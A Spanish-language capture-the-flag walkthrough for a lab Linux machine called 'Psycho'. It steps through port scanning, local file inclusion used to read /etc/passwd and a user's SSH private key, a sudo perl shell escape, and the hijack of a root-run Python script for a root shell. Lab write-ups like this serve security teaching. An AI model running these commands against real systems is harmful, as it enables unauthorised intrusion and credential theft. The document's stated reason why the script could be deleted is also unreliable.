# Máquina Psycho

#### OS: Linux
#### Tier: Easy
#### IP de ejemplo: 172.17.0.2

## Reconocimiento
comenzamos realizando un escaneo de puertos por tcp con `nmap`:
```
sudo nmap -sS -p- --open --min-rate 5000 -vvv -Pn -n 172.17.0.2
```
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
dos puertos abiertos: 22 con SSH y 80 con un servidor http. Verifiquémoslo con los scripts básicos de nmap (-sC) y tratemos de detectar la versión para cada servicio con -sV 
```
nmap -sCV -p22,80 -T4 172.17.0.2
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 4You
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

parece que en el puerto 80 se está alojando una web muy simple. Al entrar vemos lo siguiente:

![imagen](assets/psycho-front.png)

es una página estática. El fuzzing de directorios tampoco nos arroja nada nuevo, tan solo un /assets con la imagen de background de la web
```
❯ ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ -e .php,.html,.txt,.zip,.bak
```
```
assets                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
index.php               [Status: 200, Size: 2596, Words: 674, Lines: 63, Duration: 67ms]
```

si nos fijamos bien en la página, abajo hay un mensaje:

![imagen](assets/psycho-error.png)

quizás se esté tratando de reflejar algo por ahí; SQL por ejemplo, o quizás un archivo. Dado que no hay campos de input, vamos a probar a fuzzear por parámetros de inclusión de archivos, para identificat un posible LFI (Local File Inclusion), filtrando el tamaño 2596 para evadir ruido:

```
❯ ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://172.17.0.2/index.php/\?FUZZ=test -fs 2596
```
```
secret                  [Status: 200, Size: 2582, Words: 671, Lines: 63, Duration: 0ms]
```
pinta bien. Vamos a ver si el campo es vulnerable a LFI usando la wordlist `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`, específica para estos casos

![imagen](assets/psycho-lfi.png)

parece que muchos payloads han sido exitosos. Vamos a probarlo en la web directamente

```
❯ curl http://172.17.0.2/index.php\?secret\=/etc/passwd
```
```
<SNIP>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
luisillo:x:1002:1002::/home/luisillo:/bin/sh
```

genial, logramos LFI. Metemos el /etc/passwd en un archivo passwd local y listamos todos los usuarios cuya shell acabe en sh:
```
❯ cat passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
vaxei:x:1001:1001:,,,:/home/vaxei:/bin/bash
luisillo:x:1002:1002::/home/luisillo:/bin/sh
```
vemos varios usuarios. Probemos a ver la clave privada ssh del usuario vaxei


```
<SNIP>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk
2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3
tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF
ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8
t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa
OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM
<SNIP>
```


podemos ver la clave privada de Vaxei gracias al LFI. Esto no ocurre con la clave de root o la de luisillo.


## Initial Infiltration


copiamos y guardamos la clave como id_rsa. La damos permisos adecuados con chmod 600 id_rsa y nos conectamos a la máquina

```
❯ ssh -i id_rsa vaxei@172.17.0.2
```

> nota: si sale un error tipo "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!" haz este comando: ssh-keygen -f '/home/tu-home/.ssh/known_hosts' -R '172.17.0.2'

```
vaxei@378ae40545db:~$ id
uid=1001(vaxei) gid=1001(vaxei) groups=1001(vaxei),100(users)
```


## Lateral movement (vaxei -> luisillo)

empecemos a probar técnicas de movimiento lateral y escalada de privilegios
```
vaxei@378ae40545db:~$ sudo -l
Matching Defaults entries for vaxei on 378ae40545db:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on 378ae40545db:
    (luisillo) NOPASSWD: /usr/bin/perl
```
podemos ejecutar perl como el usuario luisillo sin contraseña. Busquémos cómo hacerlo en GTFObins

![imagen](assets/psycho-perl.png)

ejecutémoslo adecuando a nuestro caso

```
vaxei@378ae40545db:~$ sudo -u luisillo perl -e 'exec "/bin/sh"'
$ id  
uid=1002(luisillo) gid=1002(luisillo) groups=1002(luisillo)
```
genial. Vamos a usar el comando bash para trabajar en una bashen lugar de una sh. 

```
$ bash
luisillo@378ae40545db:/home/vaxei$ 
```

## Privilege Escalation

ahora que estamos como luisillo en la máquina, vamos a escalar privilegios. Empezamos listando permisos a nivel de sudoers:
```
luisillo@378ae40545db:/home/vaxei$ sudo -l
Matching Defaults entries for luisillo on 378ae40545db:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 378ae40545db:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```
vemos que podemos ejecutar como cualquier usuario y sin proporcionar contraseña el script /opt/paw.py. Veamos de qué se trata
```
import subprocess  
import os  
import sys  
import time  
  
# F  
def dummy_function(data):  
   result = ""  
   for char in data:  
       result += char.upper() if char.islower() else char.lower()  
   return result  
  
# Código para ejecutar el script  
os.system("echo Ojo Aqui")  
  
# Simulación de procesamiento de datos  
def data_processing():  
   data = "This is some dummy data that needs to be processed."  
   processed_data = dummy_function(data)  
   print(f"Processed data: {processed_data}")  
  
# Simulación de un cálculo inútil  
def perform_useless_calculation():  
   result = 0  
   for i in range(1000000):  
       result += i  
   print(f"Useless calculation result: {result}")  
  
def run_command():  
   subprocess.run(['echo Hello!'], check=True)  
  
def main():  
   # Llamadas a funciones que no afectan el resultado final  
   data_processing()  
   perform_useless_calculation()  
      
   # Comando real que se ejecuta  
   run_command()  
  
if __name__ == "__main__":  
   main()
   ```
es un código muy confuso. Si lo ejecutamos nos da mil errores

```
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
```
no parece tener ninguna utilidad. Listemos los permisos asociados a este script

```
luisillo@378ae40545db:~$ ls -la /opt/paw.py
-rw-r--r-- 1 root root 967 Aug 10  2024 /opt/paw.py
```
otros tienen permiso de lectura, por lo que podemos eliminar el archivo y construir nuestro propio paw.py

```
luisillo@378ae40545db:/opt$ rm paw.py 
rm: remove write-protected regular file 'paw.py'? y
```
hemos eliminado el script exitosamente, ahora creemos un nuevo paw.py

```
# paw.py
import os
os.system("/bin/bash")
```
esto nos dará una shell como root al ejecutar el script con sudo. Guardamos y ejecutamos 
```
luisillo@378ae40545db:/opt$ sudo /usr/bin/python3 /opt/paw.py
root@378ae40545db:/opt# id
uid=0(root) gid=0(root) groups=0(root)
```
ya somos root en la máquina. Psycho pwned.

### Resumen:
LFI -> sudoers perl -> custom sudoers script hijack 
